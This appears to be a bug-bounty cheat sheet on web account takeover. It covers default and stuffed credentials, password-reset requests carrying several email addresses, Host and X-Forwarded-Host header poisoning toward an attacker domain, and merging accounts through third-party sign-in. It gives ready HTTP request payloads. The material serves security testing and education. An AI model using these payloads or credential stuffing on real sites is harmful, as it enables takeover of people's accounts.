# Adding or changing email addresses

If the operations of adding a new email address or changing an existing one do not require password confirmation, session hijacking, XSS or CSRF can lead to account takeover.

# Default credentials

Try to login with default credentials into admin panels, third-party services, middleware, and etc.

You can use the following lists:
- [Default Credentials Cheat Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- [SecLists Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)

# Credential stuffing

[Credential stuffing](https://owasp.org/www-community/attacks/Credential_stuffing) is a search for leaked usernames and passwords for use in popular online services, as most users are "comfortable" using the same password everywhere.

You can use the following lists:
- [PWDB - New generation of Password Mass-Analysis](https://github.com/ignis-sec/Pwdb-Public)
- [SecLists](https://github.com/danielmiessler/SecLists)
- [Probable Wordlists - Version 2.0](https://github.com/berzerk0/Probable-Wordlists)

Resources:
- [Writeup: Credential stuffing in Bug bounty hunting](https://krevetk0.medium.com/credential-stuffing-in-bug-bounty-hunting-7168dc1d3153)
- Zeronights 2021: Valeriy Shevchenko – Fantastic bugs and where to find them
    - [Video](https://www.youtube.com/watch?v=5rDGNm3DJfU)
    - [Slides](https://zeronights.ru/wp-content/uploads/2021/09/valeri_shevchenko_fantastic_b%CC%B6e%CC%B6a%CC%B6s%CC%B6t%CC%B6s%CC%B6_bugs_and_where_to_find_them_1.pdf)

# OAuth 2.0

{% embed url="https://0xn3va.gitbook.io/cheat-sheets/web-application/oauth-2.0-vulnerabilities" %}

# Password recovery

Password recovery functionality is often implemented by sending a one-time link to email. 

## Several email addresses

Sometimes you can takeover an account by specifying several email addresses in the password recovery request. For example, if an application is vulnerable to such an attack, on a similar request:

```http
POST /users/password HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/json
Content-Length: 57

{"email": ["victim@website.com", "attacker@website.com"]}
```

an application will send the same recovery link to two email addresses.

If an app accepts form data, try the following payloads:

```http
email=victim@website.com&attacker@website.com
email=victim@website.com,attacker@website.com
email=victim@website.com|attacker@website.com
email=victim@website.com%20attacker@website.com
email=victim@website.com%09attacker@website.com
...
```

## Host header poisoning

Applications can use the `Host` header value for generating a password recovery link. If the application is vulnerable to `Host` header poisoning, you could affect the link and specify its own domain name. As a result, if the victim follows the link from the email, the recovery token will leak to the you.

There are several ways to implement `Host` header poisoning.

### X-Forwarded-Host header

The [X-Forwarded-Host](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Host) header is a header for identifying the original host requested by the client in the `Host` request header. Example of vulnerable request:

```http
POST /users/password HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: attacker-website.com
Content-Type: application/json
Content-Length: 31

{"email": "victim@website.com"}
```

References:

- [Write up: Account Takeover Through Password Reset Poisoning](https://medium.com/@vbharad/account-takeover-through-password-reset-poisoning-72989a8bb8ea)

### X-Host header

`X-Host`, like `X-Forwarded-Host`, sometimes is used to identifying the original host. Example of vulnerable request:

```http
POST /users/password HTTP/1.1
Host: vulnerable-website.com
X-Host: attacker-website.com
Content-Type: application/json
Content-Length: 31

{"email": "victim@website.com"}
```

### Several host header

You can try specifying several `Host` headers. Example of vulnerable request:

```http
POST /users/password HTTP/1.1
Host: vulnerable-website.com
Host: attacker-website.com
Content-Type: application/json
Content-Length: 31

{"email": "victim@website.com"}
```

### Host header replacement

You can try replace the `Host` header on your domain. Examples of vulnerable requests:

```http
POST /users/password HTTP/1.1
Host: attacker-website.com
Content-Type: application/json
Content-Length: 31

{"email": "victim@website.com"}
```

```http
POST /users/password HTTP/1.1
Host: attacker-website.com/vulnerable-website.com
Content-Type: application/json
Content-Length: 31

{"email": "victim@website.com"}
```

References:

- [Write up: Password Reset link hijacking via Host Header Poisoning](https://hackerone.com/reports/226659)

# Third-party sign-in or sign-up

Applications that implement third party sign-in or sign-up often identify users based on the attached email address that the third party application sends. In such cases, you can try sign-in or sign-up with two different third-party applications that are linked to the same email address. Sometimes these two accounts can be joined and you will have access to the victim's account by sign-in or sign-up with your third-party application account.

For example, suppose a victim sign-in or sign-up to `vulnerable-website.com` with `third-party-app1.com`, which is linked to `victim@website.com`. To exploit this, you can try the following:

1. Create an account at `third-party-app2.com` and enter the `victim@website.com` email address (ideal if email confirmation is not required),
2. Try sign-in or sign-up at `vulnerable-website.com` through `third-party-app2.com`,
3. If the application is vulnerable, then you will have access to the victim's account.

References:

- [Write up: account takeover https://teamplay.qiwi.com](https://hackerone.com/reports/439207)
